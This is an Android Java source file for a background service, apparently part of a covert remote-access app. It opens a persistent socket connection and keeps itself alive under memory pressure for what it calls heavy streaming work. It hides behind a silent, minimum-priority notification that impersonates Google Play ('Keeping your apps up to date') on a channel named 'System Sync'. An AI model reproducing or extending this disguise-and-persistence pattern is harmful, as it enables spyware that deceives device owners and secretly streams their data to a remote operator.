package com.access.client;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentCallbacks2;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.task.tusker.network.SocketManager;
import com.task.tusker.utils.ResourceGuard;

public class BackgroundService extends Service {

    private static final String TAG       = "BackgroundService";
    private static final String CHANNEL_ID = "SystemSyncChannel";
    private SocketManager socketManager;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, createNotification());
        // Ensure ResourceGuard is alive (DataSyncService may have started it already;
        // getInstance() is idempotent and just returns the existing singleton)
        ResourceGuard.getInstance(this);
        socketManager = SocketManager.getInstance(this);
        socketManager.connect();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /**
     * Android memory-pressure callback.  We stay running regardless of the level —
     * ResourceGuard will throttle the heavy streaming work automatically.
     */
    @Override
    public void onTrimMemory(int level) {
        super.onTrimMemory(level);
        Log.w(TAG, "onTrimMemory(" + level + ") received — staying alive, load will be balanced");
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Sync",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play")
            .setContentText("Keeping your apps up to date")
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setOngoing(true)
            .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (socketManager != null) {
            socketManager.disconnect();
        }
    }
}
